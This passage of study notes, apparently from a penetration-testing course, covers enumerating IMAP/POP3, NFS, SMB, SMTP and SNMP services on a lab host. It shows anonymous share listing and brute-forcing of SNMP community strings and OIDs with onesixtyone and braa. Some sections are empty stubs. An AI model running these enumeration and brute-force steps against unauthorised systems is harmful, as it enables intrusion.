<pre><code class="language-bash">rnemeth@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd

* LIST (\HasNoChildren) "." Important
* LIST (\HasNoChildren) "." INBOX
</code></pre>
<p>If we also use the verbose (<code>-v</code>) option, we will see how the connection is made. From this, we can see the version of TLS used for encryption, further details of the SSL certificate, and even the banner, which will often contain the version of the mail server.</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v

*   Trying 10.129.14.128:993...
* TCP_NODELAY set
* Connected to 10.129.14.128 (10.129.14.128) port 993 (#0)
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* Server certificate:
*  subject: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb
*  start date: Sep 19 19:44:58 2021 GMT
*  expire date: Jul  4 19:44:58 2295 GMT
*  issuer: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb
*  SSL certificate verify result: self signed certificate (18), continuing anyway.
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
&lt; * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4
&gt; A001 CAPABILITY
&lt; * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
&lt; A001 OK Pre-login capabilities listed, post-login capabilities have more.
&gt; A002 AUTHENTICATE PLAIN AGNyeTBsMXQzADEyMzQ=
&lt; * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
&lt; A002 OK Logged in
&gt; A003 LIST "" *
&lt; * LIST (\HasNoChildren) "." Important
* LIST (\HasNoChildren) "." Important
&lt; * LIST (\HasNoChildren) "." INBOX
* LIST (\HasNoChildren) "." INBOX
&lt; A003 OK List completed (0.001 + 0.000 secs).
* Connection #0 to host 10.129.14.128 left intact
</code></pre>
<h3 id="openssl---tls-encrypted-interaction"><a class="header" href="#openssl---tls-encrypted-interaction">OpenSSL - TLS Encrypted Interaction</a></h3>
<p>To interact with the IMAP or POP3 server over SSL, we can use <code>openssl</code>, as well as <code>ncat</code>. The commands for this would look like this:</p>
<h4 id="pop3"><a class="header" href="#pop3">POP3</a></h4>
<pre><code class="language-bash">rnemeth@htb[/htb]$ openssl s_client -connect 10.129.14.128:pop3s

CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify return:1
---
Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb

...SNIP...

---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 3CC39A7F2928B252EF2FFA5462140B1A0A74B29D4708AA8DE1515BB4033D92C2
    Session-ID-ctx:
    Resumption PSK: 68419D933B5FEBD878FF1BA399A926813BEA3652555E05F0EC75D65819A263AA25FA672F8974C37F6446446BB7EA83F9
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - d7 86 ac 7e f3 f4 95 35-88 40 a5 b5 d6 a6 41 e4   ...~...5.@....A.
    0010 - 96 6c e6 12 4f 50 ce 72-36 25 df e1 72 d9 23 94   .l..OP.r6%..r.#.
    0020 - cc 29 90 08 58 1b 57 ab-db a8 6b f7 8f 31 5b ad   .)..X.W...k..1[.
    0030 - 47 94 f4 67 58 1f 96 d9-ca ca 56 f9 7a 12 f6 6d   G..gX.....V.z..m
    0040 - 43 b9 b6 68 de db b2 47-4f 9f 48 14 40 45 8f 89   C..h...GO.H.@E..
    0050 - fa 19 35 9c 6d 3c a1 46-5c a2 65 ab 87 a4 fd 5e   ..5.m&lt;.F\.e....^
    0060 - a2 95 25 d4 43 b8 71 70-40 6c fe 6f 0e d1 a0 38   ..%.C.qp@l.o...8
    0070 - 6e bd 73 91 ed 05 89 83-f5 3e d9 2a e0 2e 96 f8   n.s......&gt;.*....
    0080 - 99 f0 50 15 e0 1b 66 db-7c 9f 10 80 4a a1 8b 24   ..P...f.|...J..$
    0090 - bb 00 03 d4 93 2b d9 95-64 44 5b c2 6b 2e 01 b5   .....+..dD[.k...
    00a0 - e8 1b f4 a4 98 a7 7a 7d-0a 80 cc 0a ad fe 6e b3   ......z}......n.
    00b0 - 0a d6 50 5d fd 9a b4 5c-28 a4 c9 36 e4 7d 2a 1e   ..P]...\(..6.}*.

    Start Time: 1632081313
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
+OK HTB-Academy POP3 Server
</code></pre>
<h4 id="imap"><a class="header" href="#imap">IMAP</a></h4>
<pre><code class="language-bash">rnemeth@htb[/htb]$ openssl s_client -connect 10.129.14.128:imaps

CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify return:1
---
Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb

...SNIP...

---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 2B7148CD1B7B92BA123E06E22831FCD3B365A5EA06B2CDEF1A5F397177130699
    Session-ID-ctx:
    Resumption PSK: 4D9F082C6660646C39135F9996DDA2C199C4F7E75D65FA5303F4A0B274D78CC5BD3416C8AF50B31A34EC022B619CC633
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 68 3b b6 68 ff 85 95 7c-8a 8a 16 b2 97 1c 72 24   h;.h...|......r$
    0010 - 62 a7 84 ff c3 24 ab 99-de 45 60 26 e7 04 4a 7d   b....$...E`&amp;..J}
    0020 - bc 6e 06 a0 ff f7 d7 41-b5 1b 49 9c 9f 36 40 8d   .n.....A..I..6@.
    0030 - 93 35 ed d9 eb 1f 14 d7-a5 f6 3f c8 52 fb 9f 29   .5........?.R..)
    0040 - 89 8d de e6 46 95 b3 32-48 80 19 bc 46 36 cb eb   ....F..2H...F6..
    0050 - 35 79 54 4c 57 f8 ee 55-06 e3 59 7f 5e 64 85 b0   5yTLW..U..Y.^d..
    0060 - f3 a4 8c a6 b6 47 e4 59-ee c9 ab 54 a4 ab 8c 01   .....G.Y...T....
    0070 - 56 bb b9 bb 3b f6 96 74-16 c9 66 e2 6c 28 c6 12   V...;..t..f.l(..
    0080 - 34 c7 63 6b ff 71 16 7f-91 69 dc 38 7a 47 46 ec   4.ck.q...i.8zGF.
    0090 - 67 b7 a2 90 8b 31 58 a0-4f 57 30 6a b6 2e 3a 21   g....1X.OW0j..:!
    00a0 - 54 c7 ba f0 a9 74 13 11-d5 d1 ec cc ea f9 54 7d   T....t........T}
    00b0 - 46 a6 33 ed 5d 24 ed b0-20 63 43 d8 8f 14 4d 62   F.3.]$.. cC...Mb

    Start Time: 1632081604
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="mqtt"><a class="header" href="#mqtt">MQTT</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="nfs-network-file-system"><a class="header" href="#nfs-network-file-system">NFS (Network File System)</a></h1>
<p>NFS is a distributed file system protocol that allows a user on a client computer to access files over a network in a manner similar to how local storage is accessed. It was originally developed by Sun Microsystems in the 1980s and has since become a widely adopted standard for file sharing in Unix and Linux environments.</p>
<p>NFS is based on the Open Network Compute Remote Procedure Call (ONC-RPC/SUNRPC) protocol: https://en.wikipedia.org/wiki/Sun_RPC</p>
<h2 id="nfs-versions"><a class="header" href="#nfs-versions">NFS Versions</a></h2>
<ul>
<li><strong>NFSv2</strong>: The original version, introduced in 1984, supports basic file operations but has limitations such as a maximum file size of 2GB.</li>
<li><strong>NFSv3</strong>: Introduced in 1995, it added support for larger file sizes (up to 64-bit), improved performance, and better error handling.</li>
<li><strong>NFSv4</strong>: Released in 2000, it introduced significant enhancements, including stateful protocol, improved security features (like Kerberos authentication), and support for file locking and delegation.</li>
<li><strong>NFSv4.1 and NFSv4.2</strong>: These are incremental updates to NFSv4, adding features like parallel NFS (pNFS) for improved performance and additional security enhancements.</li>
</ul>
<h2 id="configuration"><a class="header" href="#configuration">Configuration</a></h2>
<ul>
<li>NFS is generally simple to configure. The <code>/etc/exports</code> file on the server specifies which directories are shared and the permissions for each client.
<pre><code class="language-bash">rnemeth@htb[/htb]$ cat /etc/exports 

# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
</code></pre>
</li>
<li>On the client side, the <code>mount</code> command is used to mount NFS shares to local directories.</li>
</ul>
<h2 id="footprinting-and-enumeration"><a class="header" href="#footprinting-and-enumeration">Footprinting and Enumeration</a></h2>
<ul>
<li>When footprinting NFS, the ports 111 and 2049 are commonly associated with NFS services. Port 111 is used by the portmapper service, which helps clients locate the NFS service on the server. Port 2049 is the default port for NFS itself.</li>
<li>Tools like <code>showmount</code>, <code>nmap</code>, and <code>rpcinfo</code> can be used to enumerate NFS shares and gather information about the NFS service.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ntp"><a href="#ntp" class="header">NTP</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="quic"><a class="header" href="#quic">QUIC</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="server-message-block-smb"><a class="header" href="#server-message-block-smb">Server Message Block (SMB)</a></h1>
<p>The SMB protocol is a client-server protocol that regulates access to shared network resources such as files, printers, and other devices. It is primarily used in Windows-based networks but is also supported by other operating systems through implementations like <code>samba</code>. SMB uses TCP port 445 for direct hosting and TCP port 139 for NetBIOS over TCP/IP.SMB supports access control for file shares via ACLs on the server.</p>
<h2 id="samba"><a class="header" href="#samba">Samba</a></h2>
<ul>
<li>Samba is an open-source implementation of the SMB protocol that allows non-Windows systems to share files and printers with Windows clients.</li>
<li>Samba uses the CIFS (Common Internet File System) protocol, which is a dialect of SMB.</li>
<li>Samba can act as both a file server and a domain controller in a Windows network.</li>
</ul>
<h3 id="samba-configuration"><a class="header" href="#samba-configuration">Samba Configuration</a></h3>
<ul>
<li>The main configuration file for Samba is typically stored at <code>/etc/samba/smb.conf</code>.</li>
<li>Key sections in the <code>smb.conf</code> file include:</li>
</ul>
<pre><code class="language-bash">rnemeth@htb[/htb]$ cat /etc/samba/smb.conf | grep -v "#\|\;" 

[global]
   workgroup = DEV.INFREIGHT.HTB
   server string = DEVSMB
   log file = /var/log/samba/log.%m
   max log size = 1000
   logging = file
   panic action = /usr/share/samba/panic-action %d

   server role = standalone server
   obey pam restrictions = yes
   unix password sync = yes

   passwd program = /usr/bin/passwd %u
   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .

   pam password change = yes
   map to guest = bad user
   usershare allow guests = yes

[printers]
   comment = All Printers
   browseable = no
   path = /var/spool/samba
   printable = yes
   guest ok = no
   read only = yes
   create mask = 0700

[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
</code></pre>
<ul>
<li>In the configuration above, we see global settings and two shares: <code>[printers]</code> and <code>[print$]</code>. Global settings are applied to the entire Samba server, while share definitions specify settings for individual shared resources and can override global settings.</li>
</ul>
<h2 id="smb-versions"><a class="header" href="#smb-versions">SMB Versions</a></h2>
<ul>
<li><strong>SMB1</strong>: The original version of SMB, now considered obsolete and insecure.</li>
<li><strong>SMB2</strong>: Introduced in Windows Vista and Windows Server 2008, SMB2 brought significant performance improvements and security enhancements.</li>
<li><strong>SMB3</strong>: Introduced in Windows 8 and Windows Server 2012, SMB3 added features like encryption, improved performance, and better support for virtualized environments.</li>
</ul>
<h2 id="smb-security"><a class="header" href="#smb-security">SMB Security</a></h2>
<ul>
<li>SMB supports various authentication methods, including NTLM and Kerberos.</li>
<li>SMB3 introduced encryption to protect data in transit.</li>
<li>It is recommended to disable SMB1 due to its vulnerabilities and use SMB2 or SMB3 for better security.</li>
<li>Firewalls should be configured to restrict access to SMB ports (139 and 445) to trusted networks only.</li>
</ul>
<h2 id="common-smb-commands"><a class="header" href="#common-smb-commands">Common SMB Commands</a></h2>
<ul>
<li>
<p><code>smbclient</code>: A command-line tool to access SMB/CIFS resources on servers.</p>
<pre><code class="language-bash">  rnemeth@htb[/htb]$ smbclient -N -L //10.129.14.128

          Sharename       Type      Comment
          ---------       ----      -------
          print$          Disk      Printer Drivers
          home            Disk      INFREIGHT Samba
          dev             Disk      DEVenv
          notes           Disk      CheckIT
          IPC$            IPC       IPC Service (DEVSM)
  SMB1 disabled -- no workgroup available
</code></pre>
<ul>
<li>Once we have discovered interesting files or folders, we can download them using the get command. Smbclient also allows us to execute local system commands using an exclamation mark at the beginning (!<cmd>) without interrupting the connection.</cmd></li>
</ul>
</li>
<li>
<p><code>smbstatus</code>: Displays current Samba connections and open files.</p>
</li>
<li>
<p><code>smbpasswd</code>: Used to manage Samba user passwords.</p>
</li>
<li>
<p><code>testparm</code>: Checks the Samba configuration file for syntax errors.</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="smtp-simple-mail-transfer-protocol"><a class="header" href="#smtp-simple-mail-transfer-protocol">SMTP (Simple Mail Transfer Protocol)</a></h1>
<h2 id="overview-11"><a class="header" href="#overview-11">Overview</a></h2>
<p>SMTP (Simple Mail Transfer Protocol) is a protocol used for sending and receiving email messages over the internet. It is a text-based protocol that operates on the application layer of the OSI model and is primarily used for sending emails from a client to a mail server or between mail servers.</p>
<p>SMTP is often combined with IMAP or POP3 protocols, which are used for retrieving and storing emails on a mail server.</p>
<h2 id="smtp-definitions"><a class="header" href="#smtp-definitions">SMTP Definitions</a></h2>
<ul>
<li><strong>MTA (Mail Transfer Agent)</strong>: A software application that transfers email messages from one computer to another using SMTP.</li>
<li><strong>MUA (Mail User Agent)</strong>: A software application that allows users to read and</li>
<li><strong>MSA (Mail Submission Agent)</strong>: A software application that accepts email messages from MUAs and forwards them to MTAs for delivery.</li>
<li><strong>MDA (Mail Delivery Agent)</strong>: A software application that delivers email messages to the recipient‚Äôs mailbox.</li>
</ul>
<pre><code class="language-bash">MUA -&gt; MSA -&gt; MTA -&gt; MDA -&gt; Recipient's Mailbox (POP3/IMAP for retrieval)
</code></pre>
<h2 id="how-smtp-works"><a class="header" href="#how-smtp-works">How SMTP Works</a></h2>
<ul>
<li>SMTP uses a client-server architecture, where the email client (sender) communicates with the mail server (receiver) to send email messages.</li>
<li>The client establishes a connection to the mail server using TCP (Transmission Control Protocol) on port 25 (or port 587 for secure connections).</li>
<li>The client sends a series of commands to the server, including the sender‚Äôs email address, recipient‚Äôs email address, and the message content.
<ul>
<li>The commands are:
<ul>
<li>HELO/EHLO: Initiates the conversation between the client and server.</li>
<li>MAIL FROM: Specifies the sender‚Äôs email address.</li>
<li>RCPT TO: Specifies the recipient‚Äôs email address.</li>
<li>DATA: Indicates that the message content will follow.</li>
<li>QUIT: Ends the session.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="esmtp-extensions"><a class="header" href="#esmtp-extensions">ESMTP Extensions</a></h2>
<ul>
<li>Most modern servers support Extended SMTP (ESMTP), which adds additional features and capabilities to the standard SMTP protocol.</li>
<li>ESMTP introduces new commands such as:
<ul>
<li>AUTH: Used for authentication of the client.</li>
<li>STARTTLS: Used to initiate a secure connection using TLS (Transport Layer Security).</li>
<li>SIZE: Allows the client to specify the size of the message being sent.</li>
<li>8BITMIME: Allows the transmission of 8-bit data.</li>
<li>DSN: Provides delivery status notifications.</li>
<li>etc‚Ä¶</li>
</ul>
</li>
</ul>
<h2 id="default-configuration-postfix"><a class="header" href="#default-configuration-postfix">Default Configuration (Postfix)</a></h2>
<ul>
<li>Postfix is a popular open-source mail transfer agent (MTA) that implements the SMTP protocol.</li>
<li>Default configuration settings can typically be found at <code>/etc/postfix/main.cf</code>:
<pre><code class="language-bash">[!bash!]$ cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"

smtpd_banner = ESMTP Server 
biff = no
append_dot_mydomain = no
readme_directory = no
compatibility_level = 2
smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache
myhostname = mail1.inlanefreight.htb
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases
smtp_generic_maps = hash:/etc/postfix/generic
mydestination = $myhostname, localhost 
masquerade_domains = $myhostname
mynetworks = 127.0.0.0/8 10.129.0.0/16
mailbox_size_limit = 0
recipient_delimiter = +
smtp_bind_address = 0.0.0.0
inet_protocols = ipv4
smtpd_helo_restrictions = reject_invalid_hostname
home_mailbox = /home/postfix
</code></pre>
</li>
</ul>
<h2 id="esmtp-commands"><a class="header" href="#esmtp-commands">(E)SMTP Commands</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>AUTH PLAIN</td><td>AUTH is a service extension used to authenticate the client.</td></tr>
<tr><td>HELO</td><td>The client logs in with its computer name and thus starts the session.</td></tr>
<tr><td>MAIL FROM</td><td>The client names the email sender.</td></tr>
<tr><td>RCPT TO</td><td>The client names the email recipient.</td></tr>
<tr><td>DATA</td><td>The client initiates the transmission of the email.</td></tr>
<tr><td>RSET</td><td>The client aborts the initiated transmission but keeps the connection.</td></tr>
<tr><td>VRFY</td><td>The client checks if a mailbox is available for message transfer.</td></tr>
<tr><td>EXPN</td><td>The client also checks if a mailbox is available for messaging.</td></tr>
<tr><td>NOOP</td><td>The client requests a response to prevent disconnection due to time-out.</td></tr>
<tr><td>QUIT</td><td>The client terminates the session.</td></tr>
</tbody>
</table>
</div>
<h2 id="interacting-with-smtp-servers"><a class="header" href="#interacting-with-smtp-servers">Interacting with SMTP Servers</a></h2>
<ul>
<li>Tools like <code>telnet</code> or <code>netcat</code> can be used to manually interact with SMTP servers for testing and debugging purposes.
<pre><code class="language-bash">[!bash!]$ telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server 


HELO mail1.inlanefreight.htb

250 mail1.inlanefreight.htb


EHLO mail1

250-mail1.inlanefreight.htb
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
</code></pre>
</li>
<li>A list of all SMTP response codes can be found here: https://serversmtp.com/smtp-error/</li>
</ul>
<h2 id="security-considerations"><a class="header" href="#security-considerations">Security Considerations</a></h2>
<ul>
<li>The sender of an email can easily spoof the ‚ÄúFrom‚Äù address, making it appear as if the email is coming from a different source. This is because SMTP does not have built-in mechanisms for verifying the authenticity of the sender. However, DKIM and SPF are two widely used methods to help mitigate this issue. ESMTP with STARTTLS can also help secure the transmission of emails.</li>
</ul>
<h3 id="dkim-domainkeys-identified-mail"><a class="header" href="#dkim-domainkeys-identified-mail">DKIM (DomainKeys Identified Mail)</a></h3>
<ul>
<li>DKIM is an email authentication method that allows the receiver to check that an email was indeed sent and authorized by the owner of that domain.</li>
<li>It uses a digital signature, which is added to the email header, to verify the authenticity of the message.</li>
</ul>
<h3 id="spf-sender-policy-framework"><a class="header" href="#spf-sender-policy-framework">SPF (Sender Policy Framework)</a></h3>
<ul>
<li>SPF is an email authentication method that allows the owner of a domain to specify which mail servers are authorized to send email on behalf of that domain.</li>
<li>It helps to prevent email spoofing by allowing the receiver to check the SPF record of the sender‚Äôs domain.</li>
<li>SPF records are published in the DNS (Domain Name System) as TXT records.</li>
</ul>
<h3 id="open-relay-attack"><a class="header" href="#open-relay-attack">Open Relay Attack</a></h3>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="snmp"><a class="header" href="#snmp">SNMP</a></h1>
<p>Simple Network Management Protocol (SNMP) was created to monitor network devices. In addition, this protocol can also be used to handle configuration tasks and change settings remotely. SNMP-enabled hardware includes routers, switches, servers, IoT devices, and many other devices that can also be queried and controlled using this standard protocol. Thus, it is a protocol for monitoring and managing network devices. In addition, configuration tasks can be handled, and settings can be made remotely using this standard. The current version is SNMPv3, which increases the security of SNMP in particular, but also the complexity of using this protocol.</p>
<h2 id="communication"><a class="header" href="#communication">Communication</a></h2>
<p>In addition to the pure exchange of information, SNMP also transmits control commands using agents over UDP port 161. The client can set specific values in the device and change options and settings with these commands. While in classical communication, it is always the client who actively requests information from the server, SNMP also enables the use of so-called traps over UDP port 162. These are data packets sent from the SNMP server to the client without being explicitly requested. If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side.</p>
<p>For the SNMP client and server to exchange the respective values, the available SNMP objects must have unique addresses known on both sides. This addressing mechanism is an absolute prerequisite for successfully transmitting data and network monitoring using SNMP.</p>
<h2 id="mib-management-information-base"><a class="header" href="#mib-management-information-base">MIB (Management Information Base)</a></h2>
<p>To ensure that SNMP access works across manufacturers and with different client-server combinations, the Management Information Base (MIB) was created. MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one Object Identifier (OID), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object. MIB files are written in the Abstract Syntax Notation One (ASN.1) based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.</p>
<h2 id="oid-object-identifier"><a class="header" href="#oid-object-identifier">OID (Object Identifier)</a></h2>
<p>An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node‚Äôs position in the tree to be determined. The longer the chain, the more specific the information. Many nodes in the OID tree contain nothing except references to those below them. The OIDs consist of integers and are usually concatenated by dot notation. We can look up many MIBs for the associated OIDs in the Object Identifier Registry.</p>
<h2 id="snmp-versions"><a class="header" href="#snmp-versions">SNMP Versions</a></h2>
<h3 id="snmpv1"><a class="header" href="#snmpv1">SNMPv1</a></h3>
<p>SNMP version 1 (SNMPv1) is used for network management and monitoring. SNMPv1 is the first version of the protocol and is still in use in many small networks. It supports the retrieval of information from network devices, allows for the configuration of devices, and provides traps, which are notifications of events. However, SNMPv1 has no built-in authentication mechanism, meaning anyone accessing the network can read and modify network data. Another main flaw of SNMPv1 is that it does not support encryption, meaning that all data is sent in plain text and can be easily intercepted.</p>
<h3 id="snmpv2"><a class="header" href="#snmpv2">SNMPv2</a></h3>
<p>SNMPv2 existed in different versions. The version still exists today is v2c, and the extension c means community-based SNMP. Regarding security, SNMPv2 is on par with SNMPv1 and has been extended with additional functions from the party-based SNMP no longer in use. However, a significant problem with the initial execution of the SNMP protocol is that the community string that provides security is only transmitted in plain text, meaning it has no built-in encryption.</p>
<h3 id="snmpv3"><a class="header" href="#snmpv3">SNMPv3</a></h3>
<p>The security has been increased enormously for SNMPv3 by security features such as authentication using username and password and transmission encryption (via pre-shared key) of the data.</p>
<h2 id="security-considerations-1"><a class="header" href="#security-considerations-1">Security Considerations</a></h2>
<p>In the case of a misconfiguration, we would get approximately the same results from <code>snmpwalk</code> as just shown above. Once we know the community string and the SNMP service that does not require authentication (versions 1, 2c), we can query internal system information like in the previous example.</p>
<p>Here we recognize some Python packages that have been installed on the system. If we do not know the community string, we can use onesixtyone and SecLists wordlists to identify these community strings.</p>
<p>Often, when certain community strings are bound to specific IP addresses, they are named with the hostname of the host, and sometimes even symbols are added to these names to make them more challenging to identify. However, if we imagine an extensive network with over 100 different servers managed using SNMP, the labels, in that case, will have some pattern to them. Therefore, we can use different rules to guess them. We can use the tool crunch to create custom wordlists. Creating custom wordlists is not an essential part of this module, but more details can be found in the module Cracking Passwords With Hashcat.</p>
<p>Once we know a community string, we can use it with braa to brute-force the individual OIDs and enumerate the information behind them.</p>
<p>Once again, we would like to point out that the independent configuration of the SNMP service will bring us a great variety of different experiences that no tutorial can replace. Therefore, we highly recommend setting up a VM with SNMP, experimenting with it, and trying different configurations. SNMP can be a boon for an I.T. systems administrator as well as a curse for Security analysts and managers alike.</p>
<h2 id="tools-1"><a class="header" href="#tools-1">Tools</a></h2>
<h3 id="onesixtyone"><a class="header" href="#onesixtyone">OneSixtyOne</a></h3>
<p>OneSixtyOne is a tool used to brute-force SNMP community strings:</p>
<pre><code class="language-bash">[!bash!]$ sudo apt install onesixtyone
[!bash!]$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128

Scanning 1 hosts, 3220 communities
10.129.14.128 [public] Linux htb 5.11.0-37-generic #41~20.04.2-Ubuntu SMP Fri Sep 24 09:06:38 UTC 2021 x86_64
</code></pre>
<h3 id="braa"><a class="header" href="#braa">Braa</a></h3>
<p>Braa is a tool used to brute-force SNMP OIDs once a community string is known:</p>
<pre><code class="language-bash">[!bash!]$ sudo apt install braa
[!bash!]$ braa &lt;community string&gt;@&lt;IP&gt;:.1.3.6.*   # Syntax
[!bash!]$ braa public@10.129.14.128:.1.3.6.*

10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64
10.129.14.128:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10
10.129.14.128:20ms:.1.3.6.1.2.1.1.3.0:548
10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.5.0:htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.6.0:US
10.129.14.128:20ms:.1.3.6.1.2.1.1.7.0:78
</code></pre>
<h2 id="example-snmp-walk-output"><a class="header" href="#example-snmp-walk-output">Example SNMP Walk Output</a></h2>
<p>Example output from <code>snmpwalk</code> showing various OIDs and their values:</p>
<pre><code>iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
